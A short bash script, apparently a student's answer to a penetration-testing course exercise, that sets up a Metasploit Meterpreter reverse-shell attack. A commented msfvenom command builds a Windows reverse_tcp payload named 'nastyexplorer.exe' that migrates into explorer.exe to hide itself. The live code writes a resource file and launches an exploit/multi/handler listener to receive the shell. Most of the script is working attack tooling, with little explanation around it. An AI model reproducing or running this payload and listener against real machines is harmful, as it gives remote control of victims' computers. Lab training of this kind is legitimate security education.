#!/bin/bash

#~ Exercise 3: 

#~ 1. Create a payload (windows/meterpreter/reverse_tcp) 
#~ 2. Set the prependmigrate and prependmigrateproc such that the moment it connects, it will migrate to another running process
#~ 3. Set the listener (exploit/multi/handler) on msfconsole to listen 
#~ 4. Once the meterpreter shell started, check the process ID and process name to see that the migration is successful
#~ 5. ***Additional: Create an rc script that automatically listen using the module exploit/multi/handler


ipi=$(hostname -I)
echo "Your current internal IP address is $ipi: "

echo -e "[*] Please set the Lhost listening ip: "
read Lhost
echo -e "[*] Set the Lport listening port: "
read Lport

#msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.153.136 lport=6666 PrependMigrate=True PrependMigrateProc=explorer.exe -f exe -o nastyexplorer.exe

echo 'use exploit/multi/handler' > listen.rc
echo 'set payload windows/meterpreter/reverse_tcp' >> listen.rc
echo "set lhost $Lhost" >> listen.rc
echo "set lport $Lport" >> listen.rc
echo 'run' >> listen.rc

#-r to run from resource file
msfconsole -r listen.rc
